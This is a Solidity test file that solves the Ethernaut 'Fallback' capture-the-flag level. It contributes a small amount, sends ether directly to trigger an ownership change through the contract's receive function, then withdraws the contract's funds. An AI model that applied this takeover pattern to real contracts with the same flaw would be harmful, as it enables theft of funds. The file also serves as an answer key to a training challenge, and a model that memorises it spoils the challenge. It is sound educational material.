// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {FallbackFactory} from "../src/factories/FallbackFactory.sol";
import {Fallback} from "../src/levels/Fallback.sol";

contract FallbackTest is EthernautTest {
    function setUpLevel() public override {
	FallbackFactory factory = new FallbackFactory();
	ethernaut.registerLevel(factory);
	levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveFallback() public {
	Fallback instance = Fallback(payable(levelAddress));
	instance.contribute{value: 1 wei}();
	(bool success, ) = levelAddress.call{value: 1 wei}("");
	require(success);
	instance.withdraw();
	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }

    receive() external payable { }
}
